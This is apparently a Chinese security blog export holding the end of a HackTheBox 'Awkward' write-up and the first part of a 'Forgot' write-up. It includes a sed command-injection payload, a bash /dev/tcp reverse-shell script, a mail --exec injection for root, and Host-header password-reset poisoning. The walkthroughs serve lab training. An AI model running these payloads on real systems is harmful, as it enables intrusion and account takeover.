<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'fetch_items'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_id</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$product_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$file</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$details</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$product_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"***Hat Valley Cart***"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//don't include first line</span>
                    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$details</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$details</span> <span class="token keyword">as</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$cart_items</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cart_items</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                      <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key and value as separate values in subarray</span>
                 <span class="token punctuation">}</span>
                 <span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;tr&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span> onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="六、RCE"><a href="#六、RCE" class="headerlink" title="六、RCE"></a>六、RCE</h2><p>审计，其中在删除购物车信息的时候，会执行如下代码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
注：
'/item_id={$item_id}/d'				#删除item_id={$item_id}的行
-i {$STORE_HOME}cart/{$user_id}		#表示要操作的目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以添加一个商品到购物车，分析一下过程。如下图点击<code>ADD TO CART</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304093729084.png"></p>
<p>然后到bean用户的ssh窗口查看<code>/var/www/store/cart</code>（由上面的<code>README.md</code>文件或者<code>cart_actions.php</code>可以分析出这个路径），可以看到文件名为<code>959e-8a52-2e0-fc52</code>，也就是<code>$user_id</code>的值，文件内容里<code>item_id=1</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store/cart$ ls
959e-8a52-2e0-fc52
bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 
***Hat Valley Cart***
item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码中<code>item_id=1</code>会被代入sed命令执行，虽然有过滤，但是可以闭合绕过，这里就是可操作的地方。经过测试，对于同一个用户<code>$user_id</code>的值不会变，而且bean没有修改购物车文件的权限，但是可以先删除，然后重新写一个相同文件名的文件，如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52
***Hat Valley Cart***
item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>构造payload可参考：<a href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p>我们构造的payload及最终代入sed命令的效果如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
sed -i '1' -e "1e /tmp/shell.sh" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52
注：
-e&lt;script&gt;或--expression=&lt;script&gt;表示以选项中指定的script来处理输入的文本文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有vim，那就用nano在<code>/tmp</code>目录写入反弹shell文件<code>shell.sh</code>，并添加可执行权限</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/tmp$ nano shell.sh
bean@awkward:/tmp$ cat shell.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[本地IP]/[想要监听的PORT] 0&gt;&amp;1

bean@awkward:/tmp$ ls -l shell.sh 
-rw-rw-r-- 1 bean bean 55 Mar  4 12:29 shell.sh
bean@awkward:/tmp$ chmod +x shell.sh 
bean@awkward:/tmp$ ls -l shell.sh 
-rwxrwxr-x 1 bean bean 55 Mar  4 12:29 shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开启nc监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>打开Burpsuite，然后打开如下购物车界面，点击<code>Remove</code>的同时截获请求</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304094937675.png"></p>
<p>修改请求数据如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304113424258.png"></p>
<p>拿到www-data用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304102656231.png"></p>
<p>本地下一个<a href="https://github.com/DominicBreuker/pspy">pspy64</a>，然后开启80服务监听，再然后到bean用户的ssh窗口用wget从本地下载pspy64</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304103703710.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304133818669.png"></p>
<p>然后在www-data用户窗口执行pspy64，看到inotifywait工具在监听<code>/var/www/private/leave_requests.csv</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304114139856.png"></p>
<p>查看<code>/var/www/private/leave_requests.csv</code>内容如下，可看到是<code>Leave Request Database</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304134931478.png"></p>
<p>再看到有mail命令在发送邮件，推测是从<code>Leave Request Database</code>读取，然后发送。mail命令可以执行文件，参考：<a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
<p>我们可以写入反弹shell文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115141104.png"></p>
<p>执行如下命令，将执行反弹shell的命令写入<code>leave_requests.csv</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">www-data@awkward:~/private$ echo '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
&lt; '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
www-data@awkward:~/private$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后开启监听，稍等片刻就会拿到root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115919562.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115938244.png"></p>
<p>Over！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret">https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret</a></p>
<p><a href="https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795">https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795</a></p>
<p><a href="https://gtfobins.github.io/#sed">https://gtfobins.github.io/#sed</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Nginx</tag>
        <tag>JWT伪造</tag>
        <tag>SSRF</tag>
        <tag>awk命令</tag>
        <tag>sed命令RCE</tag>
        <tag>mail命令</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Forgot</title>
    <url>/posts/7f4bdc86.html</url>
    <content><![CDATA[<h1 id="HTB-Forgot"><a href="#HTB-Forgot" class="headerlink" title="HTB-Forgot"></a>HTB-Forgot</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li>信息搜集暴露信息：<br>①页面源码暴露用户robert-dev-14522；<br>②暴露varnish反向代理缓存可利用点（路径匹配<code>/script</code>）；</li>
<li>重置密码功能投毒成功修改robert-dev-14522密码，登录网站；</li>
<li>Varnish缓存欺骗登录admin用户，获取SSH用户diego；</li>
<li>SSH连接发现关键文件<code>ml_security.py</code>；</li>
<li>代码审计+CVE-2022-29216命令执行反弹shell获取root权限。</li>
</ol>
<h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -sC -sV 10.10.11.188
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-06 02:21 EST
Nmap scan report for 10.10.11.188
Host is up (0.62s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:20:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 493857 493844
|     Age: 71
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:21:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 493852
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;Redirecting...&lt;/title&gt;
|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://127.0.0.1"&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 06 Mar 2023 07:21:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     X-Varnish: 264229
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
......
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.69 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（SSH）、80（HTTP），并且观察到http-server-header是Werkzeug/2.1.2和Python/3.8.10，那么就极有可能是Flask框架</p>
<p>访问<code>10.10.11.188</code>，是个登录页面，可以爆破，但这不是上策</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306152844883.png" style="zoom:67%;">

<p>查看页面源码，发现如下注释内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164131479.png"></p>
<p>暴露了用户<code>robert-dev-14522</code>，而且在<code>/static</code>目录加载了很多js文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307113252811.png"></p>
<p>点击<code>FOGOT THE PASSWORD?</code>，跳转到如下<code>/forogt</code>页面，需要输入用户名</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154236754.png" style="zoom:67%;">

<p>输入admin，会提示admin用户的密码不能被重置</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154716616.png" style="zoom:67%;">

<p>随便输入其他用户名，会提示无效用户名</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154742561.png" style="zoom:67%;">

<p>随便访问一个目录，404页面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154814575.png" style="zoom:80%;">

<p>google一下404页面内容，基本确定是flask框架</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306154937806.png" style="zoom:67%;">

<p>用<code>feroxbuster</code>爆一下目录</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# feroxbuster -u http://10.10.11.188/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.188/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      246l      484w     5186c http://10.10.11.188/
200      GET      246l      484w     5189c http://10.10.11.188/login
302      GET        5l       22w      189c http://10.10.11.188/home =&gt; http://10.10.11.188/
302      GET        5l       22w      189c http://10.10.11.188/tickets =&gt; http://10.10.11.188/
200      GET      253l      498w     5227c http://10.10.11.188/forgot
200      GET      261l      517w     5523c http://10.10.11.188/reset
[####################] - 3m     30000/30000   0s      found:6       errors:0      
[####################] - 3m     30000/30000   154/s   http://10.10.11.188/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>五个目录：<code>/login</code>、<code>/home</code>、<code>/tickets</code>、<code>/forgot</code>、<code>/reset</code></p>
<p><code>/login</code>是默认登陆页面，<code>/forgot</code>刚访问过，<code>/home</code>和<code>/tickets</code>会重定向到登陆页面，那就试试访问<code>/reset</code>，可以访问，相当于跳过了<code>/forgot</code>页面输入用户名的过程</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164446032.png" style="zoom:67%;">

<p>随便输入密码，发现会提示无效token，那说明还是要回到<code>/forgot</code>页面，想办法拿到token</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306164517769.png" style="zoom:67%;">

<p>回到<code>/forgot</code>页面，输入刚才发现的用户名<code>robert-dev-14522</code>，看提示，应该是有效用户，但重置密码的链接发送到用户收件箱</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306165337667.png" style="zoom:67%;">

<h2 id="三、重置密码功能投毒"><a href="#三、重置密码功能投毒" class="headerlink" title="三、重置密码功能投毒"></a>三、重置密码功能投毒</h2><p>参考<a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning</a></p>
<p>盘一盘重置密码的逻辑：</p>
<p>第一步，用户输入用户名，提交重置密码请求；</p>
<p>第二步，服务器检查用户名是否存在，然后生成一个临时token，连带token返回一个重置密码的链接到用户的<code>inbox</code>；</p>
<p>第三步，用户访问重置密码链接，服务器验证token，token一致则可以重置密码，否则提示token无效</p>
<p>那么我们可以在第一步，截获用户提交的重置密码请求，修改HTTP头部<code>Host</code>字段值为攻击机IP，然后在攻击机IP开启http服务监听，当服务器做完第二步返回带token的重置密码的链接时，攻击机就可以收到此响应。</p>
<p>攻击机开启监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用刚才的<code>robert-dev-14522</code>用户重新发送重置密码请求，截获请求包，修改host字段为本地ip，点击<code>send</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170335445.png"></p>
<p>稍等片刻，我们就收到了服务器的响应，是个带有token的重置密码URL</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [06/Mar/2023 04:02:02] code 404, message File not found
10.10.11.188 - - [06/Mar/2023 04:02:02] "GET /reset?token=ZSDRCRl0pCgor%2FJNZl%2BgMY%2FMKBEBlPFYJZSdq4Yiti3oiS6qX3ipoFp4wFP5zD1EFR6R4oD11M4ht8kJ0X8S3w%3D%3D HTTP/1.1" 404 -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>浏览器访问带token的重置密码URL，可看到成功重置密码</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170610647.png" style="zoom:67%;">

<p>然后成功登录主页面，查看各个页面，大致剖析一下这网站功能：就是网站用户如果遇到一些权限相关的问题时（比如无法访问某站点、想做一些比自己权限高的事情），可以在[Escalate]页面提交提权申请，然后Tickets就会显示各个用户提交申请的相关信息，比如用户因为什么问题需要提权、哪个用户提交的、该用户现在的权限状态是怎样的。这个逻辑没盘明白，后面可能会一头雾水。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306170739470.png" style="zoom: 80%;">

<p>点击Tickets，可看到一个表格，表格最后一栏显示Diego用户的SSH凭证不能用，而且此用户权限已被提升，那么我们试图查看已被提权的页面[Tickets(escalated)]</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307095314480.png" style="zoom:67%;">

<p>却发现<code>Tickets(escalated)</code>无法点击，有点可疑，F12查看有目录<code>/admin_tickets</code>，已提权的用户应该给的是admin权限，那么Diego用户应该就被提升到admin权限了，那么我们就可以尝试以admin身份登录网站，从而看到Diego用户的用户名密码，也就是SSH的用户名密码。F12把class值删除或者直接访问<code>/admin_tickets</code>目录都无效，会跳转到<code>http://10.10.11.188/home?err=ACCESS_DENIED</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307141914539.png" style="zoom: 80%;">

<h2 id="四、web缓存欺骗"><a href="#四、web缓存欺骗" class="headerlink" title="四、web缓存欺骗"></a>四、web缓存欺骗</h2><p>回头看nmap的扫描结果，HTTP响应有两个罕见的字段<code>X-Varnish</code>和<code>Via</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Mon, 06 Mar 2023 07:21:40 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, GET, HEAD
Content-Length: 0
X-Varnish: 264229
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://varnish-cache.org/">Varnish</a>是一个用作缓存的反向代理程序</p>
<p><a href="https://developer.fastly.com/reference/http/http-headers/X-Varnish/">X-Varnish</a>是Varnish生成的ID号</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via">Via</a>在此处相当于指明网站服务用的HTTP/1.1和Varnish/6.2</p>
